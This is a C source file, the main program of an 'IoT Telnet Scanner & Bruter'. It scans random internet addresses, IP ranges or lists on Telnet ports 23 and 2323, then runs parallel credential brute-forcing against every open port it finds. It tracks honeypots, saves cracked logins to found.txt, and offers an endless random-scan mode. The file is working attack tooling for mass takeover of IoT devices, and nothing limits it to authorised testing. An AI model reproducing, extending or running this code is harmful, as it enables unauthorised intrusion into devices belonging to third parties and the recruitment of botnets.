#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/resource.h>

#include "include/config.h"
#include "include/bruter.h"
#include "include/combos.h"
#include "include/scanner.h"
#include "include/queue.h"

static volatile int running = 1;
static int scan_ports[] = {23, 2323};
static int port_count = 2;
static int g_max_scan = MAX_SCAN_ACTIVE;
static int g_max_brute = MAX_BRUTE_ACTIVE;

static void sig_handler(int sig) {
    (void)sig;
    running = 0;
    printf("\n[!] Stopping...\n");
}

static void raise_fds(void) {
    struct rlimit rl;
    rl.rlim_cur = MAX_FDS;
    rl.rlim_max = MAX_FDS;
    setrlimit(RLIMIT_NOFILE, &rl);
}

static void *scan_epoll_loop(void *arg) {
    (void)arg;
    struct epoll_event events[2048];

    while (running) {
        int n = epoll_wait(scan_epfd, events, 2048, 50);
        if (n <= 0) continue;

        pthread_mutex_lock(&scan_conns_mutex);
        for (int i = 0; i < n; i++) {
            int fd = events[i].data.fd;
            if (events[i].events & (EPOLLOUT | EPOLLERR | EPOLLHUP)) {
                scan_check_connect(fd);
            }
        }
        pthread_mutex_unlock(&scan_conns_mutex);
    }
    return NULL;
}

static void *scan_timeout_watcher(void *arg) {
    (void)arg;
    while (running) {
        int now = time(NULL);
        pthread_mutex_lock(&scan_conns_mutex);
        for (int i = 3; i < MAX_FDS; i++) {
            if (scan_conns[i].fd <= 0) continue;
            if ((now - scan_conns[i].last_time) >= SCAN_TIMEOUT_SEC) {
                scan_disconnect(&scan_conns[i]);
            }
        }
        pthread_mutex_unlock(&scan_conns_mutex);
        usleep(200000);
    }
    return NULL;
}

static void *brute_epoll_loop(void *arg) {
    (void)arg;
    struct epoll_event events[1024];

    while (running) {
        int n = epoll_wait(brute_epfd, events, 1024, 100);
        if (n <= 0) continue;

        pthread_mutex_lock(&brute_conns_mutex);
        for (int i = 0; i < n; i++) {
            int fd = events[i].data.fd;
            if (events[i].events & EPOLLOUT) {
                brute_check_connect(fd);
            }
            if (events[i].events & (EPOLLIN | EPOLLET)) {
                brute_handle_data(fd);
            }
            if (events[i].events & (EPOLLERR | EPOLLHUP)) {
                BruteConn *bc = &brute_conns[fd];
                if (bc->fd > 0) {
                    brute_disconnect(bc);
                    ATOMIC_INC(&g_brute_failed);
                }
            }
        }
        pthread_mutex_unlock(&brute_conns_mutex);
    }
    return NULL;
}

static void *brute_timeout_watcher(void *arg) {
    (void)arg;
    while (running) {
        int now = time(NULL);
        pthread_mutex_lock(&brute_conns_mutex);
        for (int i = 3; i < MAX_FDS; i++) {
            if (brute_conns[i].fd <= 0) continue;
            int elapsed = now - brute_conns[i].last_recv;
            int timeout = (brute_conns[i].stage == ST_CONNECTING) ? BRUTE_CONNECT_SEC : BRUTE_TIMEOUT_SEC;
            if (elapsed >= timeout) {
                brute_disconnect(&brute_conns[i]);
                ATOMIC_INC(&g_brute_failed);
            }
        }
        pthread_mutex_unlock(&brute_conns_mutex);
        usleep(500000);
    }
    return NULL;
}

static void *brute_queue_worker(void *arg) {
    (void)arg;
    char addr[ADDR_LEN];
    int port;

    while (running) {
        if (ATOMIC_GET(&g_brute_active) < g_max_brute) {
            if (queue_pop(&brute_queue, addr, &port) == 0) {
                brute_start(addr, port);
                continue;
            }
        }
        usleep(5000);
    }
    return NULL;
}

static void *scan_queue_worker(void *arg) {
    (void)arg;
    char addr[ADDR_LEN];
    int port;

    while (running) {
        if (ATOMIC_GET(&g_scan_active) < g_max_scan) {
            if (queue_pop(&scan_queue, addr, &port) == 0) {
                scan_start(addr, port);
                continue;
            }
        }
        usleep(1000);
    }
    return NULL;
}

static void *stats_printer(void *arg) {
    (void)arg;
    int sec = 0;
    while (running) {
        sleep(1);
        sec++;
        printf("[%ds] scan:%d/%d open:%d | brute:%d/%d found:%d log:%d fail:%d hp:%d | sq:%d bq:%d | %d/s\n",
               sec,
               ATOMIC_GET(&g_scan_total),
               ATOMIC_GET(&g_scan_active),
               ATOMIC_GET(&g_scan_open),
               ATOMIC_GET(&g_brute_active),
               queue_count(&brute_queue),
               ATOMIC_GET(&g_brute_found),
               ATOMIC_GET(&g_brute_logged),
               ATOMIC_GET(&g_brute_failed),
               ATOMIC_GET(&g_brute_honeypots),
               queue_count(&scan_queue),
               queue_count(&brute_queue),
               sec > 0 ? ATOMIC_GET(&g_scan_total) / sec : 0);
        fflush(stdout);
    }
    return NULL;
}

static void enqueue_ip(const char *addr) {
    for (int p = 0; p < port_count; p++) {
        if (ATOMIC_GET(&g_scan_active) < g_max_scan) {
            scan_start(addr, scan_ports[p]);
        } else {
            while (queue_push(&scan_queue, addr, scan_ports[p]) != 0 && running)
                usleep(1000);
        }
    }
}

static void scan_range_ips(uint32_t start, uint32_t end) {
    for (uint32_t ip = start; ip <= end && running; ip++) {
        char addr[16];
        ip_to_str(ip, addr);
        enqueue_ip(addr);

        while ((ATOMIC_GET(&g_scan_active) >= g_max_scan &&
                queue_count(&scan_queue) > g_max_scan) ||
               queue_count(&brute_queue) > g_max_brute * 10) {
            if (!running) break;
            usleep(1000);
        }
    }
}

static void usage(const char *prog) {
    printf("IoT Telnet Scanner & Bruter v3.0 (pipeline)\n");
    printf("Usage:\n");
    printf("  %s random <count|full> [scan_threads] [brute_threads]\n", prog);
    printf("  %s range <CIDR|start-end> [scan_threads] [brute_threads]\n", prog);
    printf("  %s file <path> [scan_threads] [brute_threads]\n", prog);
    printf("  %s stdin [scan_threads] [brute_threads]\n", prog);
    printf("\nPhase 1: Fast port scan (ports 23, 2323)\n");
    printf("Phase 2: Parallel Telnet brute-force on open ports\n");
    printf("Results saved to found.txt\n\n");
    printf("Default: scan_threads=1000, brute_threads=200\n");
}

static void start_threads(void) {
    pthread_t tid;
    pthread_create(&tid, NULL, scan_epoll_loop, NULL);
    pthread_detach(tid);
    pthread_create(&tid, NULL, scan_timeout_watcher, NULL);
    pthread_detach(tid);
    pthread_create(&tid, NULL, scan_queue_worker, NULL);
    pthread_detach(tid);

    pthread_create(&tid, NULL, brute_epoll_loop, NULL);
    pthread_detach(tid);
    pthread_create(&tid, NULL, brute_timeout_watcher, NULL);
    pthread_detach(tid);
    pthread_create(&tid, NULL, brute_queue_worker, NULL);
    pthread_detach(tid);

    pthread_create(&tid, NULL, stats_printer, NULL);
    pthread_detach(tid);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());

    raise_fds();
    combos_init();

    int is_stdin = (strcmp(argv[1], "stdin") == 0);
    int arg_offset = is_stdin ? 2 : 3;

    g_max_scan = 1000;
    g_max_brute = 200;
    if (argc > arg_offset) g_max_scan = atoi(argv[arg_offset]);
    if (argc > arg_offset + 1) g_max_brute = atoi(argv[arg_offset + 1]);
    if (g_max_scan < 1) g_max_scan = 1;
    if (g_max_scan > MAX_SCAN_ACTIVE) g_max_scan = MAX_SCAN_ACTIVE;
    if (g_max_brute < 1) g_max_brute = 1;
    if (g_max_brute > MAX_BRUTE_ACTIVE) g_max_brute = MAX_BRUTE_ACTIVE;

    printf("[*] Loaded %d credential combos\n", combo_count);
    printf("[*] Ports: 23, 2323\n");
    printf("[*] Scan threads: %d, Brute threads: %d\n", g_max_scan, g_max_brute);

    scan_init();
    brute_init();
    queue_create(&scan_queue, SCAN_QUEUE_SIZE);
    queue_create(&brute_queue, BRUTE_QUEUE_SIZE);

    start_threads();

    if (strcmp(argv[1], "random") == 0) {
        int full_mode = 0;
        int count = 1000;
        if (argc >= 3) {
            if (strcmp(argv[2], "full") == 0) {
                full_mode = 1;
            } else {
                count = atoi(argv[2]);
            }
        }

        if (full_mode) {
            printf("[*] FULL MODE — infinite random scan (Ctrl+C to stop)\n\n");
            uint64_t generated = 0;
            while (running) {
                uint32_t ip = random_ip();
                char addr[16];
                ip_to_str(ip, addr);
                enqueue_ip(addr);
                generated++;

                while ((ATOMIC_GET(&g_scan_active) >= g_max_scan &&
                        queue_count(&scan_queue) > g_max_scan) ||
                       queue_count(&brute_queue) > g_max_brute * 10) {
                    if (!running) break;
                    usleep(1000);
                }
            }
        } else {
            printf("[*] Scanning %d random IPs...\n\n", count);
            for (int i = 0; i < count && running; i++) {
                uint32_t ip = random_ip();
                char addr[16];
                ip_to_str(ip, addr);
                enqueue_ip(addr);

                while (ATOMIC_GET(&g_scan_active) >= g_max_scan &&
                       queue_count(&scan_queue) > g_max_scan && running)
                    usleep(1000);
            }
        }
    }
    else if (strcmp(argv[1], "range") == 0) {
        if (argc < 3) {
            printf("[!] Specify range: CIDR or start-end\n");
            return 1;
        }
        uint32_t start, end;
        if (parse_range(argv[2], &start, &end) < 0) {
            printf("[!] Invalid range: %s\n", argv[2]);
            return 1;
        }
        uint32_t total = end - start + 1;
        printf("[*] Scanning %u IPs in range...\n\n", total);
        scan_range_ips(start, end);
    }
    else if (strcmp(argv[1], "file") == 0) {
        if (argc < 3) {
            printf("[!] Specify file path\n");
            return 1;
        }
        FILE *fp = fopen(argv[2], "r");
        if (!fp) {
            printf("[!] Cannot open file: %s\n", argv[2]);
            return 1;
        }
        char line[256];
        int range_count = 0;
        uint64_t total_ips = 0;

        while (fgets(line, sizeof(line), fp) && running) {
            int len = strlen(line);
            while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r' || line[len-1] == ' '))
                line[--len] = 0;

            char *p = line;
            while (*p == ' ' || *p == '\t') p++;

            if (*p == '#' || *p == 0) continue;

            char *comment = strchr(p, '#');
            if (comment) {
                *comment = 0;
                len = strlen(p);
                while (len > 0 && (p[len-1] == ' ' || p[len-1] == '\t'))
                    p[--len] = 0;
            }

            uint32_t start, end;
            if (parse_range(p, &start, &end) == 0) {
                uint32_t count = end - start + 1;
                total_ips += count;
                range_count++;
                printf("[+] Range %d: %s (%u IPs)\n", range_count, p, count);
                scan_range_ips(start, end);
            } else {
                printf("[!] Skipping invalid line: %s\n", p);
            }
        }
        fclose(fp);
        printf("[*] Processed %d ranges, %lu total IPs\n", range_count, (unsigned long)total_ips);
    }
    else if (strcmp(argv[1], "stdin") == 0) {
        printf("[*] Reading IPs from stdin...\n\n");
        char line[64];
        while (fgets(line, sizeof(line), stdin) && running) {
            int len = strlen(line);
            while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
                line[--len] = 0;
            if (len == 0) continue;
            enqueue_ip(line);

            while (ATOMIC_GET(&g_scan_active) >= g_max_scan &&
                   queue_count(&scan_queue) > g_max_scan && running)
                usleep(1000);
        }
    }
    else {
        usage(argv[0]);
        return 1;
    }

    printf("\n[*] Waiting for scan to finish...\n");
    while ((ATOMIC_GET(&g_scan_active) > 0 || queue_count(&scan_queue) > 0) && running)
        usleep(100000);

    printf("[*] Scan done. Open ports found: %d. Waiting for brute to finish...\n",
           ATOMIC_GET(&g_scan_open));
    while ((ATOMIC_GET(&g_brute_active) > 0 || queue_count(&brute_queue) > 0) && running)
        usleep(100000);

    running = 0;
    usleep(200000);

    printf("\n[*] Done!\n");
    printf("[*] Scanned: %d IPs, Open: %d, Bruted: %d, Found: %d\n",
           ATOMIC_GET(&g_scan_total),
           ATOMIC_GET(&g_scan_open),
           ATOMIC_GET(&g_brute_failed) + ATOMIC_GET(&g_brute_found),
           ATOMIC_GET(&g_brute_found));
    printf("[*] Results saved to found.txt\n");

    free(scan_conns);
    free(brute_conns);
    free(scan_queue.entries);
    free(brute_queue.entries);
    return 0;
}
